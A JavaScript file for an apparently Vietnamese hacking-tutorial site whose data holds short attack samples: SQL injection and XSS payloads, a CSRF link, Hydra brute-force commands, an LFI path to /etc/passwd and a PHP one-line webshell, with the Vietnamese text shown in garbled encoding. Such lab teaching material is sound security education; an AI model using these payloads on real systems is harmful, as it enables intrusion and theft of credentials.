// ================== POSTS DATA ==================
const posts = {
  news: [
    {
      title: "Zero-Day m·ªõi tr√™n Windows",
      content: "M·ªôt l·ªó h·ªïng zero-day v·ª´a ƒë∆∞·ª£c c√¥ng b·ªë, cho ph√©p attacker leo thang ƒë·∫∑c quy·ªÅn.",
      link: "https://thehackernews.com/"
    }
  ],

  tutorials: [
    {
      title: "SQL Injection c∆° b·∫£n",
      content: "H∆∞·ªõng d·∫´n khai th√°c SQL Injection trong lab DVWA.",
      code: "' OR '1'='1\n' UNION SELECT null, username, password FROM users --"
    },
    {
      title: "XSS c∆° b·∫£n",
      content: "Demo Stored XSS trong form comment.",
      code: "<script>alert('XSS')</script>"
    },
    {
      title: "CSRF Attack",
      content: "V√≠ d·ª• g·ª≠i request thay ƒë·ªïi m·∫≠t kh·∫©u qua link CSRF.",
      code: `<img src="http://victim.com/change_pass?pw=hacked">`
    },
    {
      title: "Brute Force v·ªõi Hydra",
      content: "C√°ch brute-force form login b·∫±ng Hydra.",
      code: `hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"`
    },
    {
      title: "Directory Enumeration",
      content: "T√¨m hidden folder v·ªõi Gobuster.",
      code: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`
    },
    {
      title: "LFI/RFI c∆° b·∫£n",
      content: "Khai th√°c Local File Inclusion trong PHP.",
      code: `http://target.com/index.php?page=../../../../etc/passwd`
    },
    {
      title: "File Upload Shell",
      content: "Upload webshell qua form upload thi·∫øu filter.",
      code: `<?php system($_GET['cmd']); ?>`
    },
    {
      title: "RCE trong PHP",
      content: "Remote Code Execution th√¥ng qua eval().",
      code: `http://target.com/index.php?cmd=phpinfo()`
    },
    {
      title: "Privilege Escalation Linux",
      content: "T√¨m SUID binary ƒë·ªÉ leo thang ƒë·∫∑c quy·ªÅn.",
      code: `find / -perm -4000 -type f 2>/dev/null`
    },
    {
      title: "Privilege Escalation Windows",
      content: "Check hotfix ch∆∞a c√†i b·∫±ng systeminfo.",
      code: `systeminfo | findstr KB`
    }
    // TODO: s·∫Ω th√™m ti·∫øp 15 tutorials n·ªØa
  ],

  tools: [
    {
      title: "Port Scanner",
      content: "Tool scan port ƒë∆°n gi·∫£n v·ªõi Python.",
      code:
`import socket

target = "127.0.0.1"
for port in range(1,1000):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print("Port open:", port)
    except:
        pass`,
      filename: "port_scanner.py"
    },
    {
      title: "SQLMap Demo",
      content: "Tool t·ª± ƒë·ªông khai th√°c SQLi.",
      code: `sqlmap -u "http://target.com/index.php?id=1" --dbs`,
      filename: "sqlmap_demo.sh"
    },
    {
      title: "WPScan",
      content: "Scan l·ªó h·ªïng WordPress.",
      code: `wpscan --url http://target.com --enumerate u,vp`,
      filename: "wpscan.sh"
    },
    {
      title: "Hydra Bruteforce",
      content: "Demo brute force SSH v·ªõi Hydra.",
      code: `hydra -l root -P rockyou.txt ssh://192.168.1.100`,
      filename: "hydra_ssh.sh"
    },
    {
      title: "Nikto Scanner",
      content: "Qu√©t l·ªó h·ªïng web v·ªõi Nikto.",
      code: `nikto -h http://target.com`,
      filename: "nikto.sh"
    }
    // TODO: s·∫Ω th√™m ti·∫øp 25 tools n·ªØa
  ]
};

// ================== SANITIZE & ESCAPE ==================
function sanitizeHTML(str) {
  const temp = document.createElement("div");
  temp.textContent = str;
  return temp.innerHTML;
}

function escapeForCode(str) {
  return str.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
// ================== RENDER POSTS ==================
function renderPosts() {
  // News
  const newsContainer = document.getElementById("news");
  posts.news.forEach(post => {
    newsContainer.innerHTML += `
      <div class="card">
        <h2>üì° ${sanitizeHTML(post.title)}</h2>
        <p>${sanitizeHTML(post.content)}</p>
        <a href="${sanitizeHTML(post.link)}" target="_blank" rel="noopener noreferrer">
          <button class="btn read-btn">üîó Read More</button>
        </a>
      </div>`;
  });

  // Tutorials
  const tutContainer = document.getElementById("tutorials");
  posts.tutorials.forEach(post => {
    const pre = document.createElement("pre");
    const code = document.createElement("code");
    code.className = "language-bash";
    code.innerHTML = escapeForCode(post.code); // ‚úÖ hi·ªÉn th·ªã nguy√™n d·∫°ng
    pre.appendChild(code);

    tutContainer.appendChild(makeCard(
      sanitizeHTML(post.title),
      sanitizeHTML(post.content),
      pre,
      post.code
    ));
  });

  // Tools
  const toolContainer = document.getElementById("tools");
  posts.tools.forEach(post => {
    const pre = document.createElement("pre");
    const code = document.createElement("code");
    code.className = "language-bash";
    code.innerHTML = escapeForCode(post.code);
    pre.appendChild(code);

    toolContainer.appendChild(makeCard(
      sanitizeHTML(post.title),
      sanitizeHTML(post.content),
      pre,
      post.code,
      sanitizeHTML(post.filename)
    ));
  });

  hljs.highlightAll();
}

// ================== HELPERS ==================
function makeCard(title, content, preEl, codeStr, filename) {
  const card = document.createElement("div");
  card.className = "card";

  const h2 = document.createElement("h2");
  h2.textContent = title;
  const p = document.createElement("p");
  p.textContent = content;

  card.appendChild(h2);
  card.appendChild(p);
  card.appendChild(preEl);

  // copy button
  const copyBtn = document.createElement("button");
  copyBtn.className = "btn copy-btn";
  copyBtn.textContent = "üìã Copy";
  copyBtn.onclick = () => copyCode(codeStr);
  card.appendChild(copyBtn);

  // download button
  if (filename) {
    const dlBtn = document.createElement("button");
    dlBtn.className = "btn download-btn";
    dlBtn.textContent = "‚¨á Download";
    dlBtn.onclick = () => downloadCode(codeStr, filename);
    card.appendChild(dlBtn);
  }

  return card;
}

// ================== FUNCTIONS ==================
function copyCode(code) {
  navigator.clipboard.writeText(code).then(() => {
    alert("‚úÖ Code copied to clipboard!");
  });
}

function downloadCode(code, filename) {
  const blob = new Blob([code], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function showTab(tabId) {
  document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
  document.querySelectorAll(".content").forEach(c => c.classList.remove("active"));
  document.getElementById(tabId).classList.add("active");
  document.querySelector(`.tab[onclick="showTab('${tabId}')"]`).classList.add("active");
}

document.addEventListener("DOMContentLoaded", renderPosts);
